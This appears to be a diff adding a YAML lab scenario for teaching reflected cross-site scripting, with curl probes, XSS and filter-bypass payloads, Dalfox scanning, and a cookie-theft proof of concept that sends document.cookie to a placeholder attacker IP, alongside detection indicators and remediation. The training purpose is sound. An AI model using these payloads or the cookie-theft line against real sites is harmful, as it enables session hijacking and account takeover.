@@ -1,0 +1,153 @@
+# Category: Web Application Security - XSS
+name: "Reflected Cross-Site Scripting (XSS) Detection"
+id: "web-xss-001"
+category: "web_application"
+subcategory: "xss"
+difficulty: "beginner"
+estimated_time: "30 minutes"
+
+description: |
+  Detect and exploit reflected Cross-Site Scripting vulnerabilities in web application
+  parameters, headers, and URL fragments. Covers payload crafting and filter bypass.
+
+learning_objectives:
+  - Identify reflection points in web applications
+  - Craft context-specific XSS payloads
+  - Bypass common XSS filters and WAF rules
+  - Understand impact and map to OWASP A03:2021
+
+tools:
+  - burp_suite
+  - dalfox
+  - xsser
+  - curl
+  - web_browser
+
+prerequisites:
+  - Understanding of HTML and JavaScript
+  - Basic HTTP request/response knowledge
+  - Written authorization from target owner
+
+steps:
+  - id: "step1"
+    phase: "reconnaissance"
+    action: "Identify input reflection points in the application"
+    commands:
+      - "curl -s 'http://[target_url]/search?q=XSSTEST' | grep -i 'XSSTEST'"
+      - "curl -s 'http://[target_url]/search?q=XSSTEST' | grep -i 'XSSTEST' -A2 -B2"
+      - "curl -s -I 'http://[target_url]/search?q=XSSTEST' | grep -i 'xsstest'"
+    expected_output: "XSSTEST canary string reflected in HTML body or HTTP headers"
+    detection: "Unusual search strings in web server access logs"
+
+  - id: "step2"
+    phase: "enumeration"
+    action: "Determine HTML context of reflected input"
+    commands:
+      - "curl -s 'http://[target_url]/search?q=XSSTEST' | python3 -c \"import sys; content=sys.stdin.read(); idx=content.find('XSSTEST'); print(content[max(0,idx-200):idx+200])\""
+    expected_output: "Context revealed: inside attribute, script block, HTML body, or URL"
+    detection: "Repeated requests with probe strings from same IP"
+
+  - id: "step3"
+    phase: "exploitation"
+    action: "Test basic XSS payloads by context"
+    commands:
+      - "curl -s 'http://[target_url]/search?q=<script>alert(1)</script>'"
+      - "curl -s 'http://[target_url]/search?q=<img src=x onerror=alert(1)>'"
+      - "curl -s 'http://[target_url]/search?q=\\\"><script>alert(1)</script>'"
+      - "curl -s 'http://[target_url]/search?q=javascript:alert(1)'"
+      - "curl -s 'http://[target_url]/search?q=<svg onload=alert(1)>'"
+    expected_output: "Script tag or event handler reflected unencoded in response"
+    detection: "Script tags or JavaScript event handlers in HTTP parameters"
+
+  - id: "step4"
+    phase: "exploitation"
+    action: "Automated XSS scanning with Dalfox"
+    commands:
+      - "dalfox url 'http://[target_url]/search?q=test'"
+      - "dalfox url 'http://[target_url]/search?q=test' --follow-redirects"
+      - "dalfox url 'http://[target_url]/search?q=test' -b 'https://[burp_collaborator]'"
+      - "dalfox file urls.txt --worker 10"
+    expected_output: "Confirmed XSS payloads with proof-of-concept execution"
+    detection: "Automated tool signatures (dalfox user-agent) in server logs"
+
+  - id: "step5"
+    phase: "exploitation"
+    action: "Filter bypass techniques"
+    commands:
+      - "curl -s 'http://[target_url]/search?q=<ScRiPt>alert(1)</ScRiPt>'"
+      - "curl -s 'http://[target_url]/search?q=<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>'"
+      - "curl -s 'http://[target_url]/search?q=<details open ontoggle=alert(1)>'"
+      - "curl -s 'http://[target_url]/search?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E'"
+    expected_output: "Successful payload execution bypassing basic sanitization"
+    detection: "HTML entity encoding followed by script execution in logs"
+
+  - id: "step6"
+    phase: "exploitation"
+    action: "Cookie theft proof-of-concept"
+    commands:
+      - "curl -s 'http://[target_url]/search?q=<script>document.location=\"http://[attacker_ip]/steal?c=\"+document.cookie</script>'"
+      - "python3 -m http.server 80"
+    expected_output: "Session cookie received at attacker-controlled server"
+    detection: "Outbound requests to external domains from browser session; CSP violations"
+
+compliance_controls:
+  - standard: "PCI DSS v4.0"
+    control: "6.2.4"
+    description: "Prevent XSS attacks in web-facing applications"
+  - standard: "OWASP ASVS v4.0"
+    control: "5.3.3"
+    description: "Output encoding to prevent XSS"
+  - standard: "NIST 800-53 Rev5"
+    control: "SI-10"
+    description: "Information input validation"
+  - standard: "CIS Controls v8"
+    control: "16.1"
+    description: "Establish and maintain a secure application development process"
+
+detection:
+  network_indicators:
+    - "Script tags in HTTP GET/POST parameters"
+    - "JavaScript event handlers (onerror, onload, onclick) in parameters"
+    - "HTML entity encoded angle brackets in parameters"
+    - "Outbound requests to external domains from browser"
+  log_indicators:
+    - "Web server logs showing script tags in URI parameters"
+    - "CSP violation reports from browser"
+    - "WAF alerts for XSS pattern matches"
+  endpoint_indicators:
+    - "Browser developer console errors related to CSP violations"
+    - "Unexpected DOM modifications in page source"
+
+remediation:
+  immediate:
+    - "Apply context-aware output encoding (HTML, JS, CSS, URL encoding)"
+    - "Implement Content Security Policy (CSP) header"
+    - "Set HttpOnly and Secure flags on all session cookies"
+    - "Validate and sanitize all user input"
+  long_term:
+    - "Adopt a security-aware frontend framework with auto-escaping (React, Angular)"
+    - "Deploy WAF with XSS detection rules"
+    - "Implement subresource integrity (SRI) for external scripts"
+    - "Regular DAST scanning in CI/CD pipeline"
+
+variables:
+  target_url: "http://target.example.com"
+  attacker_ip: "10.10.10.1"
+  burp_collaborator: "your-collaborator.burpcollaborator.net"
+
+assessment_questions:
+  - "What is the difference between reflected, stored, and DOM-based XSS?"
+  - "How does a Content Security Policy mitigate XSS attacks?"
+  - "Which HTML contexts require different XSS payload structures?"
+  - "What does the HttpOnly cookie flag protect against?"
+  - "How would you bypass a filter that blocks the word 'script'?"
+
+references:
+  - url: "https://owasp.org/www-community/attacks/xss/"
+    title: "OWASP XSS Overview"
+  - url: "https://portswigger.net/web-security/cross-site-scripting"
+    title: "PortSwigger XSS Labs"
+  - url: "https://github.com/hahwul/dalfox"
+    title: "Dalfox XSS Scanner"
+  - url: "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html"
+    title: "OWASP XSS Prevention Cheat Sheet"
